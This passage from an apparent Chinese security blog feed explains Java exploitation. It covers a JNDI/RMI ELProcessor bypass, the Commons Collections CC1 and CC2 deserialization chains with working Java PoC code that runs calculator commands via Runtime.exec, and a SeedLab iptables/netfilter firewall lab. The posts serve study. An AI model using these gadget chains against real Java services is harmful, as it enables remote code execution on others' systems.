Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;Creating evil RMI registry on port 9527&quot;</span>);</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">9527</span>);</span><br><span class="line"></span><br><span class="line">    ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">    ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">    Naming.bind(<span class="string">&quot;rmi://192.168.43.1:9527/object&quot;</span>, referenceWrapper);</span><br><span class="line">    System.out.println(<span class="string">&quot;RMI服务启动成功,服务地址:&quot;</span> + <span class="string">&quot;rmi://192.168.43.1:9527/object&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220129161623770.png" alt="image-20220129161623770"></p><p>在最后的getObjectInstance方法中</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220129161853025.png" alt="image-20220129161853025"></p><p>通过反射执行我们指定的之前构造的方法</p><p>这种利用方式构造的beanClass是<code>javax.el.ELProcessor</code>，<code>ELProcessor</code>中有个<code>eval(String)</code>方法可以执行EL表达式，<code>javax.el.ELProcessor</code>是Tomcat8中的库，所以仅限Tomcat8及更高版本环境下可以通过该库进行攻击。</p><h2 id="利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制"><a href="#利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制"></a>利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制</h2><p>以后再写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h1&gt;&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-lazy-src=&quot;https://gitee.com/XZLa</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-CommonCollection2链</title>
    <link href="http://yoursite.com/2022/03/02/Java%E5%AE%89%E5%85%A8-CommonCollection2%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/02/Java%E5%AE%89%E5%85%A8-CommonCollection2%E9%93%BE/</id>
    <published>2022-03-02T03:10:36.000Z</published>
    <updated>2022-03-02T03:12:21.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><p>yso给出的利用链：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106222224668.png" alt="image-20220106222224668"></p><p>完整的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            PriorityQueue.readObject()</span><br><span class="line">                PriorityQueue.heapify()</span><br><span class="line">                    PriorityQueue. siftDown()</span><br><span class="line">                        PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                            TransformingComparator.compare()</span><br><span class="line">                                   InvokerTransformer.transform()</span><br><span class="line">                                          TemplatesImpl.newTransformer()</span><br><span class="line">                                                ......</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>可以看到，CC2使用了<code>PriorityQueue reaObject</code>作为了反序列化的入口</p><p>这里调用了<code>heapify</code>函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106222354454.png" alt="image-20220106222354454"></p><p>在这个函数里面又调用了<code>siftDown</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106222427694.png" alt="image-20220106222427694"></p><p>在这面又调用了<code>siftDownUsingComparator</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106222811868.png" alt="image-20220106222811868"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106222851527.png" alt="image-20220106222851527"></p><p>这里就调用了<code>comparator.compare()</code>，如果这里的comparator是<code>TransformingComparator</code>类型，则会调用transform函数，达到利用效果。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106223107986.png" alt="image-20220106223107986"></p><p>基于以上，想要满足程序能按照我们预想的顺序执行，我们需要满足几个条件：</p><ol><li>comparator不为空，这个条件可以通过<code>PriorityQueue</code>的构造函数完成</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106225752810.png" alt="image-20220106225752810"></p><ol start="2"><li><p>size &gt;= 2，这个条件可以通过两个add函数满足</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106225855042.png" alt="image-20220106225855042"></p></li></ol><p>而且，如果我们直接把恶意类放进<code>PriorityQueue</code>的话，那么在<code>PriorityQueue</code>的add中会调用offer</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106230201022.png" alt="image-20220106230201022"></p><p>进而调用<code>siftUp</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106230218569.png" alt="image-20220106230218569"></p><p>然后提前触发恶意类的代码执行，所以，要现将无害的信息放进<code>PriorityQueue</code>，然后最后再将恶意的类替换进去：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106230805865.png" alt="image-20220106230805865"></p><p>这里使用了yso工具类进行字段替换：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106232412250.png" alt="image-20220106232412250"></p><p>替换后：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106232448626.png" alt="image-20220106232448626"></p><p>然后，transformer调用<code>newTransformer</code>，然后触发恶意类，完成利用。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106232623683.png" alt="image-20220106232623683"></p><h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p>我们可以发现，在yso中，和CC1不一样的是，这里没有直接使用<code>InvokerTransformer</code>来完成利用（但是是可以用的），而是使用了<code>TemplatesImpl</code>:</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106232953183.png" alt="image-20220106232953183"></p><p>这里的流程是：</p><p>在<code>TemplatesImpl</code> 存在一个 成员变量<code>_bytecodes</code>,当调用 <code>TemplatesImpl#newTransformer</code> 方法时，将会把</p><p><code>_bytecodes</code> 实例化，所以我们可以将恶意代码写到类的无参构造函数或static代码块中转换为字节码赋值给<code>_bytecodes</code> ，然后找到一个位置调用<code>newTransformer</code>就能完成整个攻击。</p><p>但是要注意，这里的<code>_bytecodes</code>对象必须是<code>AbstractTranslet</code>的子类</p><p>yso通过以下方法完成了这个<code>_bytecodes</code>的创建</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106233326923.png" alt="image-20220106233326923"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106233411364.png" alt="image-20220106233411364"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220106233828049.png" alt="image-20220106233828049"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;利用链&quot;&gt;&lt;a href=&quot;#利用链&quot; class=&quot;headerlink&quot; title=&quot;利用链&quot;&gt;&lt;/a&gt;利用链&lt;/h1&gt;&lt;p&gt;yso给出的利用链：&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-lazy-src=&quot;http</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-CommonCollection1链</title>
    <link href="http://yoursite.com/2022/03/01/Java%E5%AE%89%E5%85%A8-CommonCollection%E9%93%BE/"/>
    <id>http://yoursite.com/2022/03/01/Java%E5%AE%89%E5%85%A8-CommonCollection%E9%93%BE/</id>
    <published>2022-03-01T14:48:08.000Z</published>
    <updated>2022-03-01T17:24:19.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h2><p>利用链：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231165518811.png" alt="image-20211231165518811"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">            <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure><p>自顶向下解释一下这个POC：返回值是一个<code>AnnotationInvocationHandler</code>类型的对象，这个对象在反序列化的时候会调用<code>AnnotationInvocationHandler.readObject()</code>方法，在这个方法里，调用了<code>memberValues.entrySet()</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231165900137.png" alt="image-20211231165900137"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170113959.png" alt="image-20211231170113959"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231171341341.png" alt="image-20211231171341341"></p><p>这里的<code>memberValues</code>就是参数中的<code>mapProxy</code>对象，而且这个对象是用<code>AnnotationInvocationHandler</code>动态代理的<code>lazyMap</code>对象</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170131879.png" alt="image-20211231170131879"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231171535861.png" alt="image-20211231171535861"></p><p>所以在调用<code>mapProxy</code>对象的方法时，会调用<code>AnnotationInvocationHandler.invoke()</code>，而这个invoke中调用了<code>memberValues</code>的get函数，这里的<code>memberValues</code>是<code>lazyMap</code>对象。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170348217.png" alt="image-20211231170348217"></p><p>所以，<code>lazyMap</code>对象的get函数被调用：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170536403.png" alt="image-20211231170536403"></p><p>可以看到<code>lazyMap</code>的get函数调用了<code>factory.transform</code>方法，这一步的<code>lazyMap</code>是经过<code>decorate</code>函数修饰的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170656105.png" alt="image-20211231170656105"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231170705706.png" alt="image-20211231170705706"></p><p>所以这里就是调用了<code>transformerChain</code>的transform函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231171128892.png" alt="image-20211231171128892"></p><p>然后就是链式的Transformer,会挨个执行我们定义的Transformer，获取<code>Runtime</code>对象执行命令</p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><strong>TransformedMap</strong></h2><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">         <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class,Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class</span><br><span class="line">            &#125;,<span class="keyword">new</span> String[] &#123;</span><br><span class="line">                <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;),</span><br><span class="line">         &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain);</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)</span><br><span class="line">construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br><span class="line"></span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p>依然是要想办法触发<code>transformerChain</code>的transform函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231174038980.png" alt="image-20211231174038980"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231174101891.png" alt="image-20211231174101891"></p><p>所以我们要找谁调用了这里的<code>checkSetValue</code>函数，我们找到了<code>MapEntry</code>的<code>setValue</code>函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231174623988.png" alt="image-20211231174623988"></p><p>我们在<code>AnnotationInvocationHandler</code>的<code>readObject</code>可以发现</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231193618968.png" alt="image-20211231193618968"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20211231192707577.png" alt="image-20211231192707577"></p><p>所以我们只要使var7不为空，<code>AnnotationInvocationHandler.readObject(xx)</code>就会触发漏洞。</p><p>那么如何让这个var7不为null呢？</p><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第⼀个参数必须是 Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X</p></li><li><p>被 TransformedMap.decorate 修饰的Map中必须有⼀个键名为X的元素 </p><p>所以，我们要⽤到 Retention.class ，因为Retention有⼀个⽅法，名为value；所以，为了再满⾜第⼆个条件，我需要给Map中放⼊⼀个Key是value的元素，即可。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lazyMap&quot;&gt;&lt;a href=&quot;#lazyMap&quot; class=&quot;headerlink&quot; title=&quot;lazyMap&quot;&gt;&lt;/a&gt;lazyMap&lt;/h2&gt;&lt;p&gt;利用链：&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-lazy</summary>
      
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SeedLab之firewall</title>
    <link href="http://yoursite.com/2021/01/20/SeedLab%E4%B9%8Bfirewall/"/>
    <id>http://yoursite.com/2021/01/20/SeedLab%E4%B9%8Bfirewall/</id>
    <published>2021-01-20T03:28:46.000Z</published>
    <updated>2021-01-20T03:38:37.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h1><h2 id="Task-1-Using-Firewall"><a href="#Task-1-Using-Firewall" class="headerlink" title="Task 1: Using Firewall"></a>Task 1: Using Firewall</h2><p>Linux有一个叫做iptables的工具，它本质上是防火墙。 在此任务中，目标是使用iptables设置一些防火墙策略，并在策略生效后观察系统的行为。 </p><h3 id="Prevent-A-from-doing-telnet-to-Machine-B"><a href="#Prevent-A-from-doing-telnet-to-Machine-B" class="headerlink" title="Prevent A from doing telnet to Machine B."></a>Prevent A from doing telnet to Machine B.</h3><p>本项实验需要用<code>iptables</code>实现阻挡机器A用<code>telnet </code>连接机器B，命令如下，在机器A上阻止目的ip是机器B且端口是23的数据包<strong>发出</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A OUTPUT -d 192.168.164.130 -p tcp --dport 23 -j DROP</span><br></pre></td></tr></table></figure><p>如下图，可以看到，连接不能成功</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113359384.png" alt="image-20210120113359384"></p><h3 id="Prevent-B-from-doing-telnet-to-Machine-A"><a href="#Prevent-B-from-doing-telnet-to-Machine-A" class="headerlink" title="Prevent B from doing telnet to Machine A."></a>Prevent B from doing telnet to Machine A.</h3><p>本项实验需要用<code>iptables</code>实现阻挡机器B用<code>telnet </code>连接机器A，命令如下，在机器A上阻止来源IP是机器A且端口是23的数据包<strong>进入</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A INPUT -s 192.168.164.130 -p tcp --dport 23 -j DROP</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113413269.png" alt="image-20210120113413269"></p><p>如下图，可以看到，连接不能成功</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113422776.png" alt="image-20210120113422776"></p><h3 id="Prevent-A-from-visiting-an-external-web-site"><a href="#Prevent-A-from-visiting-an-external-web-site" class="headerlink" title="Prevent A from visiting an external web site."></a>Prevent A from visiting an external web site.</h3><p>You can choose any web site that you like to block, but keep in mind, some web servers have multiple IP addresses.</p><p>这里我们选择百度为我们实验的目标网站，我们用<code>iptables</code>阻挡机器A往<code>www.baidu.com</code>发包</p><p>根据下面图片可以看到，实验前可以打开页面，实验之后页面不能打开。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113435857.png" alt="image-20210120113435857"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A OUTPUT -p tcp -d www.baidu.com --dport 80 -j DROP</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113447672.png" alt="image-20210120113447672"></p><h2 id="Task-2-Implementing-a-Simple-Firewall"><a href="#Task-2-Implementing-a-Simple-Firewall" class="headerlink" title="Task 2: Implementing a Simple Firewall"></a>Task 2: Implementing a Simple Firewall</h2><p>您在前面的任务中使用的防火墙是防火墙的包过滤类型。 这种类型的防火墙的主要部分是过滤部分，它检查每个传入和传出的数据包，并强制执行管理员设置的防火墙策略。 由于包处理是在内核中完成的，所以过滤也必须在内核中完成。 因此，实现这样的防火墙似乎需要我们修改Linux内核。 在过去，这必须通过修改和重建内核来完成。 现代Linux操作系统提供了几种新的机制，以方便在不重建内核映像的情况下操作数据包。 这两种机制是可加载内核模块(LKM)和Netfilter。</p><p>LKM允许我们在运行时向内核添加一个新模块。 这个新模块使我们能够扩展内核的功能，而不重建内核，甚至不重新启动计算机。 防火墙的数据包过滤部分可以作为LKM实现。 然而，这还不够。 为了使过滤模块阻止传入/传出数据包，必须将该模块插入到数据包处理路径中。 在Netfilter被引入Linux之前，这是不容易做到的。</p><p>Netfilter的设计是为了方便授权用户操作数据包。 Netfilter通过在Linux内核中实现多个钩子来实现这个目标。 这些钩子被插入到各种地方，包括数据包传入和传出路径。 如果我们想操作传入的数据包，我们只需要将我们自己的程序(在LKM内)连接到相应的钩子上。 一旦传入的数据包到达，我们的程序将被调用。 我们的程序可以决定这个数据包是否应该被阻塞；此外，我们还可以修改程序中的数据包。</p><p>在此任务中，需要使用LKM和Netfilter来实现包过滤模块。 该模块将从数据结构中获取防火墙策略，并使用策略来决定数据包是否应该被阻塞。 为了让您的生活更轻松，所以您可以专注于过滤部分，防火墙的核心，我们允许您在程序中硬编码防火墙策略。 </p><p>在用 <code>netfilter</code>编程的过程中，我们用以下两个函数匹配IP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_address_src</span><span class="params">(struct iphdr *ip_header, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (((ip_header-&gt;saddr &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>) != d)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> (((ip_header-&gt;saddr &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>) != c)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> (((ip_header-&gt;saddr &amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span>) != b)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> ((ip_header-&gt;saddr &amp; <span class="number">0x000000ff</span>) != a)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_address_dst</span><span class="params">(struct iphdr *ip_header, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (((ip_header-&gt;daddr &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>) != d)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> 